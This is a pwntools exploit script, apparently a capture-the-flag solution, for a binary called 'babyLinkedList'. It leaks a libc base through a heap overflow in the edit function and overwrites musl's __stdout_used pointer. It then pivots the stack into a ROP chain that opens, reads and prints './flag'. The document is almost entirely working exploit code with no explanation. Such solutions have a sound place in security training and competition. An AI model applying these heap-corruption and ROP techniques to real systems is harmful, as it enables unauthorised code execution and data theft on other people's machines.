from pwn import*
context(os='linux',arch='amd64',log_level='debug')

s = process('./babyLinkedList')

def add(size,content):
	s.sendlineafter(b'>> ', b'1')
	s.sendlineafter(b'Please input size\n', str(size))
	s.sendafter(b'Please input content\n', content)

def delete():
	s.sendlineafter(b'>> ', b'2')

def show():
	s.sendlineafter(b'>> ', b'3')

def edit(content):
	s.sendlineafter(b'>> ', b'4')
	sleep(0.1)
	s.send(content)

add(0x20, b'a')
add(0x18, b'b')

edit(b'b'*0x20)
show()
libc_base = u64(s.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x9bd20
success('libc_base=>' + hex(libc_base))

__malloc_context = libc_base + 0x98ae0
__stdout_used = libc_base + 0x98450

edit(b'\x00'*0x18 + b'\x00'*5 + b'\x82' + b'\x02\x00' + p64(__stdout_used))

edit(p64(libc_base - 0x4000))


payload = b'\x00'*0x10
payload+= p64(libc_base - 0x4000 + 0x50)
payload+= p64(libc_base  + 0x0000000000015238) # ret
payload+= b'./flag\x00\x00'
payload+= p64(libc_base + 0x000000000004aced) # mov rsp, qword ptr [rdi + 0x30]; jmp qword ptr [rdi + 0x38];

# open
payload+= p64(libc_base + 0x000000000001544d) + p64(libc_base - 0x4000 + 0x40)
payload+= p64(libc_base + 0x000000000001ee0b) + p64(0)
payload+= p64(libc_base + 0x000000000001779e) + p64(0)
payload+= p64(libc_base + 0x000000000001be72) + p64(2)
payload+= p64(libc_base + 0x0000000000023e24)

# read
payload+= p64(libc_base + 0x000000000001544d) + p64(3)
payload+= p64(libc_base + 0x000000000001ee0b) + p64(libc_base - 0x4000 + 0x1000)
payload+= p64(libc_base + 0x000000000001779e) + p64(0x100)
payload+= p64(libc_base + 0x000000000001be72) + p64(0)
payload+= p64(libc_base + 0x0000000000023e24)

# write
payload+= p64(libc_base + 0x000000000001544d) + p64(1)
payload+= p64(libc_base + 0x000000000001ee0b) + p64(libc_base - 0x4000 + 0x1000)
payload+= p64(libc_base + 0x000000000001779e) + p64(0x100)
payload+= p64(libc_base + 0x000000000001be72) + p64(1)
payload+= p64(libc_base + 0x0000000000023e24)

add(0x1500, payload)

s.sendlineafter(b'>> ', b'0')

s.interactive()
